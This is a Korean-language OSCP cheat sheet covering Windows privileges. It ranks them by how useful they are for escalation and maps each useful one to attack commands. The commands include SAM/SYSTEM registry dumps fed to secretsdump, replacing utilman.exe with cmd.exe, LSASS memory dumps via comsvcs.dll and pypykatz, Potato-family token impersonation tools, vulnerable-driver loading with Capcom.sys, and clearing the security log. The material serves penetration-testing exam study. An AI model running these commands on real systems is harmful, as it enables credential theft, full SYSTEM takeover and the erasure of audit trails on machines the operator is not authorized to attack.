# Windows 권한(Privilege) — OSCP 치트시트

한 줄 요약: OSCP 시험에서 실제로 점수가 나오는 권한은 5개뿐 (12, 13, 14, 15, 16).
나머지는 심화/무시로 나눠 아래에 전부 정리. 쉘 땄으면 무조건 `whoami /priv`부터.

# 기본

- 권한 확인: `whoami /priv` — 윈도우 쉘 따면 첫 실행
- 그룹 + 권한 전체: `whoami /all`

# 읽는 법 (3줄)

- State가 Disabled여도 된다. 공격 도구가 알아서 켠다. → 목록에 보이면 공격 대상.
- 목록에 아예 없으면 못 쓴다.
- 웹쉘, MSSQL 같은 서비스 계정 쉘이면 16번(SeImpersonate)이 있을 확률이 높다.

# 1티어 — OSCP 시험 레벨 (12, 13, 14, 15, 16)

### 12. SeBackupPrivilege

- 뜻: 백업
- 직독직해: Backup(백업하다) → 백업 프로그램처럼 다 읽어버리는 특권
- 핵심: 파일 권한(ACL) 무시하고 모든 파일 읽기. Administrator 파일도 그냥 복사됨.
  관리자, Backup Operators 그룹 기본 부여.
- 쓰는 법:
  - SAM/SYSTEM 덤프: `reg save hklm\sam C:\temp\sam` + `reg save hklm\system C:\temp\system`
  - ACL 무시하고 파일 복사: `robocopy /b C:\Users\Administrator\Desktop C:\temp secret.txt`
  - Kali에서 해시 추출: `secretsdump.py -sam sam -system system LOCAL`

### 13. SeRestorePrivilege

- 뜻: 복원
- 직독직해: Restore(복원하다) → 백업 복원하듯 아무데나 쓰는 특권
- 핵심: ACL 무시하고 모든 파일 쓰기 + 파일 소유권 변경 가능. 백업이 읽기면 이건 쓰기.
- 쓰는 법: 서비스 실행 파일을 내 파일로 교체 → 서비스 재시작 → SYSTEM
  - 교체: `copy malicious.exe C:\Path\To\Service.exe`
  - 재시작: `sc stop 취약서비스` 후 `sc start 취약서비스`
- 12번과 같이 붙어있는 경우가 많음 (Backup Operators 그룹)

### 14. SeTakeOwnershipPrivilege

- 뜻: 소유권 강탈
- 직독직해: Take(가져가다) Ownership(소유권) → 남의 소유권을 빼앗는 특권
- 핵심: 아무 파일/레지스트리/서비스의 소유자가 될 수 있음.
  소유권만으론 권한이 없으니 3단계로 씀: 소유권 획득 → 나에게 권한 부여 → 읽기/쓰기
- 쓰는 법 (utilman.exe 교체 → 로그온 화면 접근성 버튼 = SYSTEM cmd):
  - 소유권 획득: `takeown /f C:\Windows\System32\utilman.exe`
  - 권한 부여: `icacls C:\Windows\System32\utilman.exe /grant Everyone:F`
  - 교체: `copy cmd.exe C:\Windows\System32\utilman.exe`
  - 재부팅 트리거가 필요하면 23번(SeShutdown)으로 해결
- 레지스트리도 동일 원리: SAM 키, 서비스 키 소유권 탈취 → binPath 변조

### 15. SeDebugPrivilege

- 뜻: 디버그
- 직독직해: Debug(디버그하다) → 모든 프로세스를 디버거처럼 만지는 특권
- 핵심: 권한 제한 없이 SYSTEM 프로세스(lsass.exe) 메모리를 열 수 있음.
  관리자 기본 부여. "관리자인데 SYSTEM이 아닌" 상태에서 크리덜을 꺼내는 통로.
- 쓰는 법:
  - LSASS 덤프: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\out.dmp full` (PID는 `tasklist`로 확인)
  - Kali에서 크리덜 추출: `pypykatz lsa minidump out.dmp`
  - Meterpreter면: `load kiwi` 후 `creds_all`
- 이미 SYSTEM이면 불필요. lsass에 프로세스 주입(migrate)도 같은 권한의 활용.

### 16. SeImpersonatePrivilege

- 뜻: 가장 (다른 사람인 척)
- 직독직해: Impersonate(가장하다) → 다른 사용자 토큰으로 실행하는 특권
- 핵심: 관리자 + 모든 서비스 계정(LOCAL SERVICE, NETWORK SERVICE, IIS, MSSQL...)에
  기본 부여. 웹쉘/서비스 쉘이면 거의 무조건 있음. OSCP 최빈출.
- 원리: 이 권한만으로 토큰을 훔칠 수는 없음. "가진 토큰을 쓸 수 있는" 권한이라,
  SYSTEM이 나한테 인증하게 유도해서(Potato 계열) 토큰을 받아낸 뒤 씀.
- OS 버전별 도구:
  - Server 2019 / Win10 1809 이상: `PrintSpoofer.exe -i -c cmd`
  - Server 2012 ~ 2022 폭넓게: `GodPotato -cmd "cmd /c whoami"`
  - Server 2008 / 2012 이하 구형: `JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c whoami" -t *`
  - 전부 모아둔 올인원: `SweetPotato.exe -a "whoami"`

# 2티어 — 심화, OSCP보다 한 수 위 (보이면 럭키)

### 25. SeManageVolumePrivilege

- 뜻: 볼륨 관리
- 직독직해: Manage(관리하다) Volume(볼륨) → 디스크 볼륨을 관리하는 특권
- 핵심: 디스크 조각모음·확장 같은 유지보수 권한. 기본 부여가 아니라 정책에서 따로
  줘야 보임 → 보이는 순간 고평가. 툴 한 방에 C:\ 전체 쓰기가 풀림.
- 쓰는 법:
  - C:\ 전체 쓰기 획득: `SeManageVolumeAbuse.exe`
  - 시스템 DLL 교체: `copy PrintConfig.dll C:\Windows\System32\spool\drivers\`
  - 트리거: `sc stop spooler` 후 `sc start spooler` → SYSTEM

### 27. SeLoadDriverPrivilege

- 뜻: 드라이버 로드
- 직독직해: Load(올리다) Driver(드라이버) → 커널 드라이버를 올리는 특권
- 핵심: 드라이버 = 커널 권한(RING-0)까지 가는 통로. 대신 서명 안 된 내 드라이버는
  못 올리고, 서명됐는데 취약한 드라이버(Capcom.sys)를 대신 올려야 함.
- 쓰는 법:
  - 드라이버 등록 + 로드: `EoPLoadDriver System01 C:\temp\Capcom.sys`
  - SYSTEM 쉘: `ExploitCapcom.exe`
- Users 그룹에 이 권한을 준 비표준 설정이면 확정 경로.

### 28. SeTcbPrivilege

- 뜻: 운영체제 일부로 행동
- 직독직해: TCB(신뢰할 수 있는 컴퓨팅 기반) → OS 커널과 동격의 신뢰를 받는 특권
- 핵심: Windows 권한 체계의 정점. 아무 계정의 로그온 세션/토큰을 만들 수 있어서
  원하는 계정인 척 가능 → 사실상 SYSTEM. 기본 부여 계정 없음.
  PSExec가 SYSTEM 서비스를 띄우는 원리가 이 권한.
- 판정: 보이면 이미 끝난 거나 마찬가지.

### 조합용 (단독으론 안 되고 다른 권한과 세트)

### 4. SeIncreaseQuotaPrivilege

- 뜻: 쿼터 증가
- 직독직해: Increase(늘리다) Quota(할당량) → 프로세스에 자원을 더 주는 특권
- 핵심: 다른 프로세스의 메모리 할당량을 늘려줌. 단독으론 아무것도 못 하고 18번과 세트.
- 판정: 18번과 함께 보이면 토큰 계열 공격 가능 신호 → 16번과 동일하게 Potato.

### 18. SeAssignPrimaryTokenPrivilege

- 뜻: 기본 토큰 할당
- 직독직해: Assign(할당하다) Primary(기본) Token(토큰) → 프로세스에 다른 사용자의 토큰을 끼워주는 특권
- 핵심: 다른 사용자 토큰으로 프로세스 실행 가능. 16번이 "가장(impersonation) 토큰"이면
  이건 "기본(primary) 토큰" 버전. 서비스 계정에 16번과 같이 기본 부여.
- 원리: 토큰을 훔치는 권한이 아니라 가진 토큰을 쓰는 권한이라, Potato 도구가 내부적으로 알아서 활용.

### 23. SeShutdownPrivilege

- 뜻: 시스템 종료
- 직독직해: Shutdown(끄다) → 시스템을 끄고 재시작하는 특권
- 핵심: `shutdown /r /t 0`. 단독 공격은 아니고 재부팅이 트리거인 공격의 마무리용.
  (utilman 교체처럼 "재부팅 후 적용되는" 공격, 설치 기반 공격의 재부팅 요구 충족)

### 10. SeCreateSymbolicLinkPrivilege

- 뜻: 심볼릭 링크 생성
- 직독직해: Create(만들다) Symbolic Link(심볼릭 링크) → 바로가기 같은 링크를 만드는 특권
- 핵심: NTFS 링크 생성 권한. 기본 부여 계정이 거의 없어 보이는 것 자체가 특이점.
  단독 권한상승은 아니고, 서비스의 파일 경로를 링크로 바꿔치기하는 조합 공격의 재료.

### 8. SeCreateGlobalPrivilege

- 뜻: 전역 객체 생성
- 직독직해: Create(만들다) Global(전역) → 모든 세션에서 보이는 객체를 만드는 특권
- 핵심: 관리자·서비스 그룹 기본 부여라 서비스 계정 쉘에 자주 보임.
  그 자체가 공격은 아니고, 네임드 파이프 협상이 필요한 다른 공격의 사전 조건 역할.

### 26. SeSystemEnvironmentPrivilege

- 뜻: 시스템 환경 (펌웨어 변수)
- 직독직해: System(시스템) Environment(환경) → 펌웨어 환경 변수를 바꾸는 특권
- 핵심: UEFI NVRAM 변수 쓰기. 부팅 구성 변조, Secure Boot 관련 연구 재료.
  OS 레벨로 바로 가는 공개 공격 경로는 희귀.

# 3티어 — 무시해도 됨 (1~3, 5~7, 9, 11, 17, 19~22, 24)

전부 성능·편의·감사용. 권한상승 경로 없음. 보여도 넘어가면 됨.

### 1. SeLockMemoryPrivilege

- 뜻: 메모리 잠금
- 직독직해: Lock(잠그다) Memory(메모리) → 메모리를 잠가 고정하는 특권
- 핵심: 메모리를 페이징 없이 고정하는 성능 옵션(대용량 DB용). 보안 경계가 아님.
- 판정: 무시.

### 2. SeCreatePagefilePrivilege

- 뜻: 페이지 파일 생성
- 직독직해: Create(만들다) Pagefile(페이지 파일) → 가상메모리 파일을 만드는 특권
- 핵심: pagefile.sys 생성/크기 변경. 변경은 재부팅 후 적용, 공격 표면 없음.
- 판정: 무시.

### 3. SeIncreaseWorkingSetPrivilege

- 뜻: 작업 집합 증가
- 직독직해: Increase(늘리다) Working Set(작업 집합) → 프로세스의 메모리 점유량을 늘리는 특권
- 핵심: 프로세스가 쓰는 물리 RAM 최소/최대량 보증. 모든 사용자 기본 부여라 모든 쉘에 보임.
- 판정: 무시. 보인다고 달라지는 게 없음.

### 5. SeIncreaseBasePriorityPrivilege

- 뜻: 기본 우선순위 증가
- 직독직해: Increase(늘리다) Base(기본) Priority(우선순위) → CPU 우선순위를 올리는 특권
- 핵심: 프로세스 우선순위를 Realtime까지 상승. 성능 조절일 뿐 권한상승 불가.
- 판정: 무시.

### 6. SeSystemProfilePrivilege

- 뜻: 시스템 프로파일링
- 직독직해: System(시스템) Profile(분석) → 시스템 전체 성능을 분석하는 특권
- 핵심: 시스템 전체 샘플링 분석. 메모리 내용 엿보기 논의는 있으나 실전 공격 사례 없음.
- 판정: 무시.

### 7. SeProfileSingleProcessPrivilege

- 뜻: 단일 프로세스 프로파일링
- 직독직해: Profile(분석) Single(하나) Process(프로세스) → 프로세스 하나만 분석하는 특권
- 핵심: 6번의 축소판. 개별 프로세스 성능 카운터/샘플링.
- 판정: 무시.

### 9. SeCreatePermanentPrivilege

- 뜻: 영구 객체 생성
- 직독직해: Create(만들다) Permanent(영구) → 영구히 남는 커널 객체를 만드는 특권
- 핵심: 드라이버/커널 개발용으로 시스템 전용인 권한.
- 판정: 무시.

### 11. SeChangeNotifyPrivilege

- 뜻: 변경 알림 우회
- 직독직해: Change(변경) Notify(알림) → 실제 기능은 "폴더 통과 검사 우회"
- 핵심: 나열 권한이 없는 폴더도 경로로 통과할 수 있게 해줌. 모든 사용자 기본 부여.
- 판정: 무시. 기본값이라 항상 보이는 것.

### 17. SeDelegateSessionUserImpersonatePrivilege

- 뜻: 세션 사용자 가장 위임
- 직독직해: Delegate(위임하다) Session(세션) User(사용자) Impersonate(가장) → 같은 세션의 사용자로 가장할 권한을 위임받는 특권
- 핵심: 비교적 최근 추가된 권한. 기본 부여 계정이 사실상 없고 공개 익스플로잇도 희귀.
- 판정: 무시. 보이면 기록만.

### 19. SeSecurityPrivilege

- 뜻: 보안 로그 관리
- 직독직해: Security(보안) → 보안 로그를 다루는 특권
- 핵심: 보안 이벤트 로그 열람/삭제(`wevtutil cl Security`), 감사 정책 설정.
  권한상승이 아니라 침투 후 흔적 지우기용.
- 판정: 무시. OSCP 점수와 무관.

### 20. SeAuditPrivilege

- 뜻: 감사 기록 생성
- 직독직해: Audit(감사하다) → 보안 로그에 기록을 생성하는 특권
- 핵심: 19번이 "보고 지우는" 권한이면 이건 "쓰는" 권한. 가짜 로그 위조용.
- 판정: 무시.

### 21. SeSystemtimePrivilege

- 뜻: 시스템 시간 변경
- 직독직해: System(시스템) Time(시간) → 시스템 시각을 바꾸는 특권
- 핵심: 시각 변경. AD 환경에선 Kerberos 시간 오차 장애 유발 가능하지만 권한상승은 아님.
- 판정: 무시.

### 22. SeTimeZonePrivilege

- 뜻: 표준시간대 변경
- 직독직해: Time Zone(시간대) → 시간대를 바꾸는 특권
- 핵심: 모든 사용자 기본 부여. 실질 무해.
- 판정: 무시.

### 24. SeUndockPrivilege

- 뜻: 도킹 해제
- 직독직해: Undock(도킹 해제) → 도킹 스테이션에서 분리하는 특권
- 핵심: 물리 도킹/언도킹 제어. 서버·VM에서 존재 자체가 무의미.
- 판정: 무시.

# 빠른 의사결정

`whoami /priv` 실행 후:

- 16 보임 → OS 버전 확인 → PrintSpoofer / GodPotato / JuicyPotato
- 12 보임 → reg save SAM/SYSTEM → Kali secretsdump
- 13 보임 → 서비스 파일 교체 자리 탐색 → 교체 후 재시작
- 14 보임 → utilman.exe 교체 → 로그온 화면 트리거
- 15 보임 → LSASS 덤프 → pypykatz
- 25 보임 → SeManageVolumeAbuse → PrintConfig.dll
- 27 보임 → Capcom.sys + ExploitCapcom
- 4+18 세트 → 16번과 동일하게 Potato
- 이 외 전부 → 무시하고 다른 privesc 벡터로 (서비스 설정, AlwaysInstallElevated, 자동실행 등)
